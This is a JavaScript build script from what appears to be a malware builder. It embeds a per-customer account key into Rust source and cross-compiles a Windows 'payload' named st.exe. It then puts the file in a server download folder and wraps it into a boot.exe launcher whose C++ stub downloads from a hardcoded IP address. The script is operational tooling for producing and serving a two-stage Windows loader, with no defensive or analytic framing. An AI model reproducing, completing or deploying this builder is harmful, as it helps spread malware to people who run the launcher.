// language: JavaScript, file: builder/rustbuild.js
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import { compileLauncher } from './compile.js';

const execFileP = promisify(execFile);
const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT_DIR = path.join(__dirname, '..');
const DOWNLOAD_DIR = path.join(ROOT_DIR, 'download');

export async function buildBoot({ key }) {
  let rustDir = path.join(ROOT_DIR, 'client');
  if (!fs.existsSync(rustDir)) rustDir = ROOT_DIR;

  const embeddedKeyPath = path.join(rustDir, 'src', 'embedded_key.rs');
  fs.writeFileSync(embeddedKeyPath, `pub const ACCOUNT_KEY: &str = "${key}";\n`);

  console.log('[build] compiling rust payload (st.exe)...');
  try {
    await execFileP('cargo', ['build', '--release', '--target', 'x86_64-pc-windows-gnu', '-j', '2'], {
      cwd: rustDir,
      timeout: 5 * 60_000,
      maxBuffer: 64 * 1024 * 1024,
    });
  } catch (e) {
    throw new Error(`cargo failed:\n${e.stdout}\n${e.stderr}`);
  }

  const baseExe = path.join(rustDir, 'target', 'x86_64-pc-windows-gnu', 'release', 'boot.exe');
  if (!fs.existsSync(baseExe)) {
    throw new Error(`rust build missing output at ${baseExe}`);
  }

  // Copy the compiled rust exe to the server's download folder as st.exe
  if (!fs.existsSync(DOWNLOAD_DIR)) fs.mkdirSync(DOWNLOAD_DIR, { recursive: true });
  fs.copyFileSync(baseExe, path.join(DOWNLOAD_DIR, 'st.exe'));

  console.log('[build] wrapping into boot.exe...');
  // We pass the server IP to the compiler so the C++ stub knows where to download from
  // Replace '127.0.0.1' with your actual server IP if needed
  const bootBuf = await compileLauncher({ key, config: { ip: '81.167.1.117' }, baseExe });
  return bootBuf;
}